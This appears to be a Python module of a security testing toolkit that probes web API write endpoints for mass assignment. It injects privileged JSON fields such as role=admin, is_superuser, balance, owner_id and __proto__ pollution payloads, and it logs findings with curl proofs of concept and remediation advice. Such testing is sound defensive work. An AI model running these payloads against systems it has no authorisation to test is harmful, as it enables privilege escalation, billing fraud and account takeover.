"""
BugKit v4 — Mass Assignment / Over-Posting Tester

Detects when servers accept extra JSON fields that should be read-only
or server-controlled, such as:

  { "username": "bob", "role": "admin" }          → privilege escalation
  { "email": "bob@x.com", "verified": true }      → email verify bypass
  { "plan": "enterprise", "credits": 99999 }      → billing abuse
  { "is_staff": true, "is_superuser": true }       → Django admin bypass
  { "balance": 10000 }                             → financial manipulation

Strategy:
  1. For every POST/PUT/PATCH endpoint, send the legitimate body PLUS
     one injected privileged field at a time.
  2. Compare the response to a clean baseline (no injected fields).
  3. Anomalies = the injected field is reflected back, or response
     body/behaviour changes meaningfully.
  4. Also inspect response for the injected key name/value being present.
"""
from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any, List, Optional, Tuple

from core.session import BugKitSession
from core import logger
from db import queries


# ── Privileged field catalogue ─────────────────────────────────────────
# Format: (field_name, test_value, description)
PRIV_FIELDS: List[Tuple[str, Any, str]] = [
    # Roles / permissions
    ("role",          "admin",              "Role escalation to admin"),
    ("role",          "superadmin",         "Role escalation to superadmin"),
    ("roles",         ["admin"],            "Roles array escalation"),
    ("is_admin",      True,                 "Admin flag"),
    ("is_staff",      True,                 "Staff flag (Django)"),
    ("is_superuser",  True,                 "Superuser flag (Django)"),
    ("admin",         True,                 "Admin boolean"),
    ("superadmin",    True,                 "Superadmin boolean"),
    ("permissions",   ["*"],               "Wildcard permissions"),
    ("scopes",        ["admin:all"],        "Admin scope injection"),
    ("group",         "admin",              "Group assignment"),
    ("groups",        ["admin"],            "Groups array"),
    ("privilege",     "high",              "Privilege level"),
    ("access_level",  9999,                "Access level number"),

    # Verification / trust
    ("verified",      True,                "Email verified bypass"),
    ("email_verified",True,                "Email verified flag"),
    ("confirmed",     True,                "Account confirmed bypass"),
    ("active",        True,                "Account activation"),
    ("approved",      True,                "Approval bypass"),
    ("trusted",       True,                "Trust flag"),
    ("kyc_verified",  True,                "KYC bypass"),

    # Billing / plan
    ("plan",          "enterprise",        "Plan upgrade bypass"),
    ("plan",          "pro",               "Plan upgrade to pro"),
    ("subscription",  "premium",           "Subscription bypass"),
    ("credits",       999999,              "Credit injection"),
    ("balance",       999999,              "Balance manipulation"),
    ("trial_end",     "2099-01-01",        "Trial extension"),
    ("quota",         999999,              "Quota increase"),
    ("limit",         0,                   "Limit removal"),

    # Identity ownership
    ("user_id",       1,                   "User ID override"),
    ("owner_id",      1,                   "Owner ID override"),
    ("account_id",    1,                   "Account ID override"),
    ("org_id",        1,                   "Org ID override"),
    ("tenant_id",     1,                   "Tenant ID override"),

    # Internal flags
    ("internal",      True,                "Internal flag"),
    ("debug",         True,                "Debug mode"),
    ("beta",          True,                "Beta access"),
    ("feature_flags", {"admin_panel": True}, "Feature flag injection"),
    ("__proto__",     {"admin": True},     "Prototype pollution via JSON"),
    ("constructor",   {"prototype": {"admin": True}}, "Constructor pollution"),
]


@dataclass
class MassAssignResult:
    url:         str
    method:      str
    field:       str
    value:       Any
    accepted:    bool = False
    reflected:   bool = False
    diff_signal: str  = ""
    confidence:  str  = "low"


class MassAssignTester:
    """
    Mass assignment / over-posting detector.

    Usage:
        tester = MassAssignTester(session)
        tester.run(target_id=1, base_url="https://api.example.com", identity="userA")
    """

    def __init__(self, session: BugKitSession) -> None:
        self.session   = session
        self._findings = 0

    def run(
        self,
        target_id: int,
        base_url:  str,
        identity:  str = None,
    ) -> int:
        logger.section(f"Mass Assignment Tester  →  {base_url}")
        self._tid      = target_id
        self._base     = base_url.rstrip("/")
        self._identity = identity
        self._findings = 0

        # Collect writable endpoints from DB
        write_eps = [
            ep for ep in queries.get_endpoints(target_id)
            if (ep.method or "GET") in ("POST", "PUT", "PATCH")
        ]

        # Also probe heuristic endpoints
        heuristic = self._heuristic_endpoints()
        all_eps = self._merge_endpoints(write_eps, heuristic)

        logger.info(f"Testing {len(all_eps)} writable endpoint(s)…")

        for url, method in all_eps:
            self._test_endpoint(url, method)

        logger.section("Mass Assignment Summary")
        logger.ok(f"Findings: {self._findings}")
        return self._findings

    # ── Core test ──────────────────────────────────────────────────────

    def _test_endpoint(self, url: str, method: str) -> None:
        # Step 1: baseline request (minimal valid body)
        baseline_body = {"name": "test", "email": "test@test.com"}
        baseline = self.session.request(
            method, url,
            json          = baseline_body,
            identity_name = self._identity,
            capture       = False,
        )
        if baseline is None:
            return
        if baseline.status_code in (404, 405, 410):
            return

        baseline_json = self._try_json(baseline)

        # Step 2: test each privileged field
        for field_name, field_value, description in PRIV_FIELDS:
            injected_body = dict(baseline_body)
            injected_body[field_name] = field_value

            resp = self.session.request(
                method, url,
                json          = injected_body,
                identity_name = self._identity,
                capture       = True,
            )
            if resp is None:
                continue

            result = self._analyze(
                url, method, field_name, field_value,
                baseline, resp, baseline_json,
            )

            if result.accepted:
                sev  = self._severity(field_name, field_value)
                conf = result.confidence
                cap  = self.session.last_capture

                self._save(
                    title       = f"Mass Assignment — `{field_name}` accepted",
                    url         = url,
                    method      = method,
                    severity    = sev,
                    confidence  = conf,
                    field_name  = field_name,
                    field_value = str(field_value)[:100],
                    detail      = (
                        f"{description}.\n\n"
                        f"Field `{field_name}` with value `{field_value!r}` was accepted "
                        f"by {method} {url}.\n\n"
                        f"Signal: {result.diff_signal}"
                    ),
                    evidence    = (
                        f"Injected:  {json.dumps({field_name: field_value})}\n"
                        f"Baseline status: {baseline.status_code}\n"
                        f"Injected status: {resp.status_code}\n"
                        f"Reflected: {result.reflected}\n"
                        f"Diff: {result.diff_signal}"
                    ),
                    raw_request = cap.raw_request  if cap else "",
                    raw_response= cap.raw_response[:2000] if cap else "",
                    curl_poc    = cap.curl         if cap else "",
                )

    def _analyze(
        self,
        url:           str,
        method:        str,
        field_name:    str,
        field_value:   Any,
        baseline_resp: Any,
        injected_resp: Any,
        baseline_json: Optional[dict],
    ) -> MassAssignResult:
        result = MassAssignResult(url=url, method=method,
                                  field=field_name, value=field_value)

        # Check 1: field reflected in response body
        resp_text = injected_resp.text or ""
        val_str   = str(field_value).lower()
        if field_name in resp_text.lower() and val_str in resp_text.lower():
            result.reflected  = True
            result.accepted   = True
            result.confidence = "high"
            result.diff_signal = f"Field `{field_name}={field_value}` reflected in response"
            return result

        # Check 2: response JSON changed in a meaningful way
        injected_json = self._try_json(injected_resp)
        if baseline_json and injected_json and isinstance(baseline_json, dict):
            from core.diff import _flatten
            flat_b = _flatten(baseline_json)
            flat_i = _flatten(injected_json)
            for key, val in flat_i.items():
                if key not in flat_b and field_name.lower() in key.lower():
                    result.accepted    = True
                    result.confidence  = "high"
                    result.diff_signal = f"New key `{key}={val}` appeared in response"
                    return result
                if key in flat_b and flat_b[key] != val:
                    if field_name.lower() in key.lower():
                        result.accepted    = True
                        result.confidence  = "medium"
                        result.diff_signal = f"Key `{key}` changed: {flat_b[key]!r}→{val!r}"
                        return result

        # Check 3: status code improved (from 4xx to 2xx with injected field)
        if (baseline_resp.status_code >= 400 and
                injected_resp.status_code < 400):
            result.accepted    = True
            result.confidence  = "medium"
            result.diff_signal = (
                f"Status improved {baseline_resp.status_code}→{injected_resp.status_code}"
                " when field was injected"
            )
            return result

        # Check 4: significant body size increase (new data returned)
        size_b = len(baseline_resp.content)
        size_i = len(injected_resp.content)
        if size_i > size_b * 1.5 and size_b > 0:
            result.accepted    = True
            result.confidence  = "low"
            result.diff_signal = (
                f"Response grew {size_b}B→{size_i}B ({(size_i/size_b-1)*100:.0f}%) "
                "after field injection"
            )

        return result

    # ── Helpers ────────────────────────────────────────────────────────

    def _try_json(self, resp) -> Optional[Any]:
        try:
            return resp.json()
        except Exception:
            return None

    def _heuristic_endpoints(self) -> List[Tuple[str, str]]:
        paths = [
            ("/api/user",           "PUT"),
            ("/api/users/me",       "PUT"),
            ("/api/profile",        "PATCH"),
            ("/api/account",        "PATCH"),
            ("/api/settings",       "PUT"),
            ("/api/register",       "POST"),
            ("/api/signup",         "POST"),
            ("/api/v1/users/me",    "PUT"),
            ("/api/v1/profile",     "PATCH"),
            ("/api/v2/users/me",    "PUT"),
        ]
        return [(self._base + p, m) for p, m in paths]

    def _merge_endpoints(
        self,
        db_eps:    list,
        heuristic: List[Tuple[str, str]],
    ) -> List[Tuple[str, str]]:
        seen:   set = set()
        result: List[Tuple[str, str]] = []
        for ep in db_eps:
            key = (ep.url, ep.method or "POST")
            if key not in seen:
                seen.add(key)
                result.append(key)
        for url, method in heuristic:
            key = (url, method)
            if key not in seen:
                seen.add(key)
                result.append(key)
        return result[:40]  # cap to prevent sprawl

    def _severity(self, field: str, value: Any) -> str:
        if field in ("role", "is_admin", "is_superuser", "is_staff",
                     "admin", "superadmin", "permissions", "scopes"):
            return "CRITICAL"
        if field in ("plan", "subscription", "balance", "credits",
                     "verified", "email_verified", "owner_id", "user_id"):
            return "HIGH"
        return "MEDIUM"

    def _save(
        self,
        title:       str,
        url:         str,
        method:      str,
        severity:    str,
        confidence:  str,
        field_name:  str,
        field_value: str,
        detail:      str,
        evidence:    str,
        raw_request: str,
        raw_response:str,
        curl_poc:    str,
    ) -> None:
        queries.save_finding(
            target_id    = self._tid,
            module       = "massassign",
            title        = title,
            severity     = severity,
            confidence   = confidence,
            url          = url,
            method       = method,
            parameter    = field_name,
            payload      = field_value,
            detail       = detail,
            evidence     = evidence,
            raw_request  = raw_request,
            raw_response = raw_response,
            curl_poc     = curl_poc,
            impact       = (
                "Attacker can set server-side protected fields by including them "
                "in request body. Common outcomes: privilege escalation, email "
                "verification bypass, billing plan abuse, account takeover."
            ),
            remediation  = (
                "Use an explicit allowlist of accepted fields (DTO/form pattern). "
                "Never bind request body directly to ORM models. "
                "Strip any fields not defined in the update schema before processing."
            ),
            cwe  = "CWE-915",
            cvss = (9.8 if severity == "CRITICAL" else
                    8.1 if severity == "HIGH" else 6.5),
            tags = ["mass-assignment", "over-posting", "access-control"],
        )
        self._findings += 1
        logger.finding(title=title, severity=severity, url=url, confidence=confidence)
